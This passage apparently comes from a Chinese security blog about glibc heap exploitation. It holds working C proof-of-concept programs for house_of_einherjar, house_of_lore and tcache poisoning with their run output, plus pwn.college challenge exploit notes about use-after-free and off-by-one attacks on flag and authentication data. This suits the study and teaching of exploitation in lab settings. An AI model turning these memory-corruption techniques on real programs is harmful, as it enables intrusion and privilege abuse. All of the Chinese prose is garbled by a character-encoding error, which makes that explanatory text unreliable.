barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    fake_chunk_header = a;          <span class="comment">//consruct a fake chunk inside chunk a&#x27;s memory</span></span><br><span class="line">    fake_chunk_header[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    fake_chunk_header[<span class="number">1</span>] = <span class="number">0x130</span>;</span><br><span class="line">    fake_chunk_header[<span class="number">2</span>] = &amp;fake_chunk_header[<span class="number">0</span>];</span><br><span class="line">    fake_chunk_header[<span class="number">3</span>] = &amp;fake_chunk_header[<span class="number">0</span>];</span><br><span class="line">    fake_chunk_mem = fake_chunk_header + <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    b[<span class="number">0x30</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = <span class="number">0x130</span>;         <span class="comment">//fake_c_prevsize</span></span><br><span class="line">    <span class="type">char</span> * size_ptr = &amp;b[<span class="number">0x38</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)]; </span><br><span class="line">    *size_ptr= <span class="number">0</span>;     <span class="comment">//off by one</span></span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x220</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target: %p\n&quot;</span>, target);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk_mem: %p\n&quot;</span>, fake_chunk_mem);</span><br><span class="line">    assert(target == fake_chunk_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_einherjar.c -o house_of_einherjar -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_einherjar</span><br><span class="line">target: 0x5591c4d6f9b0</span><br><span class="line">fake_chunk_mem: 0x5591c4d6f9b0</span><br></pre></td></tr></table></figure>



<h3 id="smallbins"><a href="#smallbins" class="headerlink" title="smallbins"></a>smallbins</h3><h4 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h4><p>æ”»å‡»å‡è®¾:å¯¹é‡Šæ”¾è¿›å…¥<code>smallbins</code>ä¸­çš„å †å—æœ‰<code>UAF</code>,èƒ½å¤Ÿä¿®æ”¹å…¶<code>bk</code>æŒ‡é’ˆ</p>
<p>1.é‡Šæ”¾ä¸€ä¸ªå †å—<code>victim</code>è¿›å…¥<code>smallbins</code></p>
<p>2.å¯¹<code>victim</code>è¿›è¡Œ<code>UAF</code>,ä¿®æ”¹å…¶<code>bk</code>æŒ‡é’ˆæŒ‡å‘<code>a</code>å †å—</p>
<p>3.<code>a</code>å‰ä¸<code>victim</code>ç›¸è¿,åä¸<code>b</code>ç›¸è¿</p>
<p>4.<code>b</code>åé¢åªä½¿ç”¨<code>bk</code>æŒ‡é’ˆæŒ‚äº†ä¸€ä¸²å †å—(èƒ½å¤Ÿå¡«æ»¡<code>tcahe</code>)</p>
<p>5.æ¸…ç©º<code>tcache</code>ç„¶å<code>malloc</code>,å¯¼è‡´<code>a</code>,<code>b</code>ä»¥åŠä¸€è¿ä¸²æ‹–å®¶å¸¦å£è¿›å…¥<code>tcache</code></p>
<p>6.æ­¤åä»<code>tcache</code>ä¸­åˆ†é…å¯ä»¥è¿›è¡Œä»»æ„åœ°å€å†™</p>
<p>ç”»ä¸ªå›¾æ„æ€æ„æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241105134342656.png" alt="house_of_lore"></p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> *fd;</span><br><span class="line">    <span class="type">size_t</span> *bk;</span><br><span class="line">&#125;BinChunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *victim;</span><br><span class="line">    <span class="type">size_t</span> *victim_header;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line">    BinChunk a;						<span class="comment">//on stack</span></span><br><span class="line">    BinChunk b;						<span class="comment">//on stack</span></span><br><span class="line">    BinChunk fake_freelist[<span class="number">7</span>];		<span class="comment">//on stack</span></span><br><span class="line">    <span class="type">size_t</span> * target;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        fake_freelist[i].bk = &amp;fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">    &#125;       <span class="comment">//fake_freelist[0] =&gt; fake_freelist[1] =&gt; fake_freelist[2] =&gt; ... fake_freelist[6]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">    victim_header = (<span class="type">char</span>*)victim - <span class="number">0x10</span>;</span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(victim);           <span class="comment">//now victim is in unsorted bin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);         <span class="comment">//sort victim into smallbin</span></span><br><span class="line">    <span class="comment">//suppose we have UAF to modify victim.bk points to a</span></span><br><span class="line"><span class="comment">///////////////////////////////////</span></span><br><span class="line">    victim[<span class="number">1</span>] = &amp;a; <span class="comment">//UAF</span></span><br><span class="line"><span class="comment">///////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    a.fd = victim_header;</span><br><span class="line">    a.bk = &amp;b;</span><br><span class="line">    b.fd = &amp;a;</span><br><span class="line">    b.bk = &amp;fake_freelist[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// smallbins[idx] =&gt; victim &lt;=&gt; a &lt;=&gt; b =&gt; fake_freelist[0] =&gt; fake_freelist[1] =&gt; ... fake_freelist[6]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);   <span class="comment">//empty tcache</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//get victim again and use smallbins to fill tcache</span></span><br><span class="line">    <span class="comment">//tcache[idx] =&gt; fake_freelist[4] =&gt; fake_freelist[3] =&gt; fake_freelist[2] =&gt; fake_freelist[1] =&gt; fake_freelist[0] =&gt;b =&gt;a</span></span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//fetch fake_freelist[4] from tcache</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target = %p\n&quot;</span>,target);</span><br><span class="line">    assert(target == &amp;fake_freelist[<span class="number">4</span>].fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_lore.c -o house_of_lore -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_lore</span><br><span class="line">victim = 0x563ada3d8a10</span><br><span class="line">victim = 0x563ada3d8a10</span><br><span class="line">target = 0x7ffd93539ed0</span><br></pre></td></tr></table></figure>



<h2 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h2><h3 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h3><p>æ”»å‡»å‡è®¾:</p>
<p>0.åªæœ‰<code>malloc</code>,æ²¡æœ‰<code>calloc</code></p>
<p>1.æœ€å¤šæŒæœ‰16ä¸ªå †å—æŒ‡é’ˆ,å¯ä»¥å¡«å……<code>tcache</code></p>
<p>2.<code>free</code>ä¹‹åä¸æ¸…ç©ºæŒ‡é’ˆ,å¯ä»¥<code>UAF</code></p>
<p>å¯ä»¥è€ƒè™‘ <code>fastbin_dup_with_consolidate</code>çš„æ€è·¯</p>
<p>0.å¡«å……tcache</p>
<p>1.æ‰¾ä¸€ä¸ªä¸topchunkç›¸é‚»çš„å°å †å—,freeè¿›å…¥fastbins</p>
<p>2.read_flagå‘èµ·0x52Aå­—èŠ‚çš„åˆ†é…è¯·æ±‚,åˆå¹¶fastbinså †å—åˆ°topchunk,å¹¶æ‹¿åˆ°flag_chunk</p>
<p>3.ç›´æ¥ä»å°å †å—ä¸ŠUAF,putså³å¯æ³„éœ²flag</p>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>æ”»å‡»å‡è®¾:</p>
<p>0.æœ‰mallocä¹Ÿæœ‰calloc, mallocæœ€å¤§0x420, callocæ— é™åˆ¶</p>
<p>1.freeä¸æ¸…ç©ºæŒ‡é’ˆ,UAF</p>
<ol start="2">
<li></li>
</ol>
<h3 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h3><p>æœ€å°3000å­—èŠ‚çš„å †å—</p>
<p>åªèƒ½è€ƒè™‘largebinså’Œunsortedbinçš„åˆ©ç”¨æ–¹æ³•</p>
<p>ç›®æ ‡æ˜¯å°†<code>authenticated @ 0x4041C0</code>å†™ä¸Šä»»æ„å€¼</p>
<p>æ­¥éª¤:</p>
<p>å¤§äº3000å­—èŠ‚çš„largebin,æ¯”å¦‚<code>0xbc0-0xbf0</code></p>
<p>å¯ä»¥ç”³è¯·0xbd0,0xbe0</p>
<p>1.A &#x3D; malloc(0xbe0)</p>
<p>barrier</p>
<p>2.B &#x3D; malloc(0xbe0)</p>
<p>barrier</p>
<p>3.C &#x3D; malloc(0xbd0)</p>
<p>barrier</p>
<p>3.free(A),free(B)è¿›å…¥largebin,UAFæ³„éœ²binåœ°å€å’Œå †å—åœ°å€</p>
<p>4.malloc(0xbe0)æ‹¿ä¸€ä¸ªå‡ºæ¥,å‰©ä¸‹ä¸€ä¸ª</p>
<p>5.UAFå°†authenticatedæŒ‚åˆ°bk_nextsizeä¸Š</p>
<p>6.free(C)</p>
<h3 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h3><p>æœ‰è¶Šç•Œå†™</p>
<p>1.UAFæ³„éœ²å †å—åŸºåœ°å€</p>
<p>2.æ ¹æ®ç›¸å¯¹åç§»é‡è®¡ç®—å¾—åˆ°flag_chunkçš„åœ°å€</p>
<p>å¦‚ä½•å°†alloc_structæ”¾åˆ°å †å—é‡Œ?</p>
<h3 id="level6-0"><a href="#level6-0" class="headerlink" title="level6.0"></a>level6.0</h3><h3 id="level7-0"><a href="#level7-0" class="headerlink" title="level7.0"></a>level7.0</h3><p>ç¦ç”¨tcache</p>
<p>æ³„éœ²flagåœ°å€</p>
<p>fastbinåˆ©ç”¨,æœ‰UAF,</p>
<h3 id="level8-0"><a href="#level8-0" class="headerlink" title="level8.0"></a>level8.0</h3><p>æœ€å¤§ç”³è¯·0x1000</p>
<p>å †é£æ°´:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">A</span><br><span class="line">----------------</span><br><span class="line">flag</span><br><span class="line">----------------</span><br><span class="line">B</span><br><span class="line">----------------</span><br><span class="line">C</span><br><span class="line">----------------</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>







<p>1.é€šè¿‡Bæ„é€ <code>C-&gt;prev_size</code>å¹¶é€šè¿‡<code>off-by-one</code>å°†<code>C-&gt;prev_in_use</code>  å½’0</p>
<p>2.åœ¨Aä¸­æ„é€ å‡çš„å †å—å¤´,è¿™éœ€è¦è®¾ç½®<code>fd</code>å’Œ<code>bk</code>æŒ‡é’ˆ</p>
<p>3.<code>free C</code>,å‘å‰åˆå¹¶åˆ°<code>A</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/T%E6%93%A6%E8%BD%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/T%E6%93%A6%E8%BD%A6/" class="post-title-link" itemprop="url">tcache</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-17 23:24:00 / Modified: 23:24:35" itemprop="dateCreated datePublished" datetime="2024-10-17T23:24:00+08:00">2024-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Tæ“¦è½¦"><a href="#Tæ“¦è½¦" class="headerlink" title="Tæ“¦è½¦"></a>Tæ“¦è½¦</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -o ProxyCommand=&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.college</span><br><span class="line">scp -o ProxyCommand=&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.college:/challenge/babyheap_level15.0  .</span><br></pre></td></tr></table></figure>



<h2 id="tcacheæ•°æ®ç»“æ„ä¸ç®—æ³•"><a href="#tcacheæ•°æ®ç»“æ„ä¸ç®—æ³•" class="headerlink" title="tcacheæ•°æ®ç»“æ„ä¸ç®—æ³•"></a>tcacheæ•°æ®ç»“æ„ä¸ç®—æ³•</h2><h3 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc-2.27"></a>glibc-2.27</h3><h4 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h4><p> åœ¨<code>glibc-2.27</code>ä¸Š<code>Tcache</code>é•¿è¿™æ ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241009161233717.png" alt="image-20241009161233717"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¯ä¸ªçº¿ç¨‹æœ‰ä¸€ä¸ªtcache,å› æ­¤tcacheçš„çº¿ç¨‹å®ä¾‹åå«tcache_perthread_struct</span></span><br><span class="line"><span class="comment">//countså’Œentriesæ˜¯å†—ä½™çš„,åªæ˜¯ä¸ºäº†æ€§èƒ½æ‰€ä»¥ä½¿ç”¨äº†countsè®¡æ•°</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="comment">//æ¯ä¸ªtcacheæœ‰TCACHE_MAX_BINS = 64 ä¸ªæ¡¶å­</span></span><br></pre></td></tr></table></figure>

<p>æ˜¾ç„¶æ¯ä¸ªæ¡¶å­é‡Œé¢çš„<code>chunk</code>å¤§å°ä¸ä¸€æ ·,å¹¶ä¸”å’Œæ¡¶å­ä¸‹æ ‡<code>idx</code>æœ‰æ˜ å°„å…³ç³»,å…·ä½“æ¥è¯´æ˜¯:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk size convert to tcache index:</span><br><span class="line">csize2tidx(csize) = (csize<span class="number">-0x11</span>) &gt;&gt; <span class="number">4</span> </span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>tcacheä¸‹æ ‡</th>
<th>chunk_size</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x20</td>
</tr>
<tr>
<td>1</td>
<td>0x30</td>
</tr>
<tr>
<td>2</td>
<td>0x40</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
</tr>
</tbody></table>
<blockquote>
<p>åœ¨<code>amd64</code>ä¸Š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SIZE_SZ = <span class="number">0x8</span></span><br><span class="line">MALLOC_ALIGNMENT = <span class="number">0x10</span></span><br><span class="line">MINSIZE = <span class="number">0x20</span></span><br><span class="line">MIN_CHUNK_SIZE = <span class="number">0x20</span></span><br><span class="line">MALLOC_ALIGN_MASK = <span class="number">0xf</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h4><h5 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h5><p><code>glibc </code>åœ¨<code>2.26</code>ä¹‹å, å¼•å…¥äº†<code>TCACHE</code>æœºåˆ¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc</span><br><span class="line">	tcache_get</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    checked_request2size(bytes, tbytes);</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);		<span class="comment">//è®¡ç®—tcacheæ¡¶ä¸‹æ ‡</span></span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins			<span class="comment">//ä¸‹æ ‡æœ€é«˜æ˜¯TCACHE_MAX_BINS = 64</span></span><br><span class="line">        <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">        &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)	<span class="comment">//tc_idxä¸‹æ ‡æ¡¶å­é‡Œè‡³å°‘æœ‰ä¸€ä¸ªå †å—</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);	<span class="comment">//ä»æ¡¶å­é‡Œæ‹¿ä¸€ä¸ªå †å—è¿”å›</span></span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰ä»»ä½•åµŒå¥—, é›¶å¸§èµ·æ‰‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];		<span class="comment">//FIFOæ ˆ</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);				<span class="comment">//å†ç¡®ä¿ä¸€ä¸‹æ²¡æœ‰è¶Šç•Œ</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);				<span class="comment">//å†ç¡®ä¿ä¸€ä¸‹è‡³å°‘æœ‰ä¸€ä¸ªå †å—</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;				<span class="comment">//ä¸‹ä¸€ä¸ªå—æˆä¸ºå¤´å—</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);						<span class="comment">//å—è®¡æ•°-1</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;								<span class="comment">//è¿”å›å †å—</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•´ä¸ªè¿‡ç¨‹ä¸­<code>tcache-&gt;counts[tc_idx]</code>åªæ˜¯éšæ‰‹ä¸€è®°å½•,å¹¶æ²¡æœ‰æ ¹æ®å…¶å€¼åˆ¤æ–­æ˜¯å¦è¿˜æœ‰å †å—</p>
<p>çœŸæ­£çš„åˆ¤æ–­æ˜¯æ ¹æ®æ¡¶å­å¤´æŒ‡é’ˆæ˜¯å¦ä¸ºç©ºå†³å®šçš„</p>
<p>å½“ä¸€ä¸ªå †å—è¿”å›åˆ°<code>tcache</code>ä¸­æ—¶, å¦‚æœå¯ä»¥<code>UAF</code>, é‚£ä¹ˆå°±å¯ä»¥æŠŠä»»æ„å‡çš„å †å—å¡è¿›å»</p>
<p>å†™ä¸ªpocæ„æ€ä¸€ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *chunk2;</span><br><span class="line">    <span class="type">size_t</span> *chunk3;</span><br><span class="line">    <span class="type">size_t</span> *chunk4;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = fake_chunk1;        <span class="comment">//UAF , chunk1 link fake_chunk1 into tcache</span></span><br><span class="line">    fake_chunk1[<span class="number">0</span>] = fake_chunk2;   <span class="comment">//fake_chunk1 link fake_chunk2 into tcache</span></span><br><span class="line"></span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous chunk1</span></span><br><span class="line">    chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous fake_chunk1</span></span><br><span class="line">    chunk4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous fake_chunk2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk1: %p\n&quot;</span>, fake_chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk2: %p\n&quot;</span>, fake_chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2: %p\n&quot;</span>, 